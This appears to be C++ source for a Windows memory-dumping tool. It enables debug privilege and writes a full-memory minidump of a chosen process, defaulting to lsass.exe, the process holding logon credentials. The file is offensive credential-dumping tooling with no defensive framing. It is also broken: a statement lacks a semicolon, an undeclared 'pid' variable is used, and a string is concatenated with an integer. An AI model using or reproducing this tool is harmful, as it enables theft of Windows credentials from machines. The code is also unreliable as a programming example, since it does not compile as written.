#define _WIN32_WINNT _WIN32_WINNT_WINXP
#include <Windows.h>
#include <Dbghelp.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>
#include <string>
#include <map>


#pragma comment(lib, "Dbghelp.lib")
#pragma comment(lib, "Advapi32.lib")


namespace Utils{

	typedef std::map<std::string, std::string> Argmap;

	void Log(std::string msg, bool err, bool hint,bool shelp)
	{
		if(err){
			std::cerr << "[-] " << msg << std::endl;
			ExitProcess(0);
		}
		else if(hint)
			std::cout << "[*] " << msg << std::endl;
		else
			std::cout << "[+] " << msg << std::endl;
	}

	Argmap ArgParser(int argc, char* argv[])
	{
		std::vector<std::string> args(argv + 1, argv + argc);
		std::vector<std::string> opt_list{"url","pname", "pid", "path"};
		std::map<std::string, std::string> armap;
		for(auto it = args.begin(); it!=args.end(); ++it){
			bool in = false;
			for(auto itt = opt_list.begin(); itt!= opt_list.end(); ++itt)
				if(it->substr(0, it->find("=")) == *itt)
					in = true;
			if(in)
				armap.emplace(it->substr(0, it->find("=")), it->substr(it->find("=") + 1));
			else
				Log("Invalid option : " + it->substr(0, it->find("=")), true, true, false);

		}
		return armap;
	}

	bool IsSet(Argmap& args, std::string opt)
	{
		for(auto it = args.begin(); it!=args.end(); ++it)
			if(it->first == opt)
				return true;
		return false;
	}
}

namespace MemDump{

	typedef struct{
		DWORD pid;
		std::string pname;
		std::string dumpfile;
		std::string url;
	}DumpProc;

	std::string GetDumpDirectory()
	{
		CHAR szPath[MAX_PATH];
		GetTempPath(MAX_PATH, szPath);
		std::string dirstring(szPath);
		dirstring += "\\memdump\\";
		CreateDirectory(dirstring.c_str(), NULL);
		return dirstring;
	}

	DWORD GetProcByName(std::string& pname)
	{
		PROCESSENTRY32 entry;
    		entry.dwSize = sizeof(PROCESSENTRY32);

    		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    		if (Process32First(snapshot, &entry) == TRUE)
        		while (Process32Next(snapshot, &entry) == TRUE)
            		if (stricmp(entry.szExeFile, pname.c_str()) == 0){
            			CloseHandle(snapshot);
            			return  entry.th32ProcessID;
            		}

    		CloseHandle(snapshot);
    		return 0;
	}

	VOID EnableDebugPriv()
	{
    		HANDLE hToken;
    		LUID luid;
    		TOKEN_PRIVILEGES tkp;
    		OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
    		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);
    		tkp.PrivilegeCount = 1;
    		tkp.Privileges[0].Luid = luid;
    		tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    		AdjustTokenPrivileges(hToken, false, &tkp, sizeof(tkp), NULL, NULL);
    		CloseHandle(hToken); 
	}

	VOID MemDump(DWORD wPid, PCHAR szFileName)
	{
		const DWORD dwOpenProcFlags = 	PROCESS_ALL_ACCESS|
										PROCESS_VM_READ |
										PROCESS_QUERY_INFORMATION |
										PROCESS_DUP_HANDLE |
										THREAD_ALL_ACCESS;

		const DWORD dwDumpFlags = 	MiniDumpWithFullMemory |
									MiniDumpWithFullMemoryInfo |
									MiniDumpWithHandleData |
									MiniDumpWithUnloadedModules |
									MiniDumpWithThreadInfo;

		Utils::Log("Opening process ...", false, false, true);
		HANDLE hProcHandle = OpenProcess(dwOpenProcFlags, FALSE, wPid);
		if(!hProcHandle)
			Utils::Log("Can't open process .", true, false, false);
		Utils::Log("Process opened .", false, false, false);

		Utils::Log("Creating dumping file ...", false, false, true);
		HANDLE hFile = CreateFile(szFileName, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if(!hFile)
			Utils::Log("Can't create dumping file .", true, false, false);
		Utils::Log("File created .", false, false, false);

		Utils::Log("Running MiniDumpWriteDump ...", false, false, true)
		BOOL bDmp = MiniDumpWriteDump(hProcHandle, wPid, hFile, (MINIDUMP_TYPE)dwDumpFlags, NULL, NULL, NULL);
		if(!bDmp)
			Utils::Log("Can't dump the memory .", true, false, false);
		Utils::Log("Memory Dumped !", false, false, false);

		CloseHandle(hProcHandle);
		CloseHandle(hFile);

 	}
}

int main(int argc, char* argv[])
{
	MemDump::EnableDebugPriv();
	Utils::Argmap args = Utils::ArgParser(argc, argv);
	MemDump::DumpProc *dProc = new MemDump::DumpProc();

	if(Utils::IsSet(args, "pid"))
		dProc->pid = atoi(args.find("pid")->second.c_str());
	
	else
		if(Utils::IsSet(args, "pname"))
			dProc->pid = MemDump::GetProcByName(args.find("pname")->second);
		else
			dProc->pid = MemDump::GetProcByName(std::string("lsass.exe"));

	if(dProc->pid == 0)
			Utils::Log("No such process . ", true, false, false);

	if(Utils::IsSet(args, "path"))
		dProc->dumpfile = args.find("path")->second + "//dump" + pid + ".bin";
	else
		dProc->dumpfile = MemDump::GetDumpDirectory() + "//dump" + std::to_string(pid) + ".bin";


	Utils::Log("Dumping process " + dProc->pid + " to " + dProc->dumpfile, false, false, true);
	MemDump::MemDump(dProc->pid, (PCHAR)dProc->dumpfile.c_str());

	return 0;
}
